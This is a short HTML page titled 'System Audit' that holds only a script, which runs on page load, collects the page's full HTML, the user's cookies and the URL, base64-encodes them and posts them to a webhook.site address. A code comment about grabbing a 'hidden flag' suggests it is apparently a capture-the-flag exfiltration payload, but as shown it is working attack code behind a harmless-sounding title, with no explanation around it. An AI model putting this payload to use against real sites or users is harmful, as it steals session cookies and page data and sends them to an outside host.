<!DOCTYPE html>
<html>
<head><title>System Audit</title></head>
<body>
    <script>
    (async function() {
    const webhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';
    
    // This grabs the hidden flag from the Next.js page state or the body
    const content = document.documentElement.innerHTML;
    const cookies = document.cookie;

    fetch(webhook, {
        method: 'POST',
        body: btoa(JSON.stringify({ 
            data: content, 
            vault: cookies,
            location: window.location.href 
        }))
    });
})();
    </script>
</body>
</html>
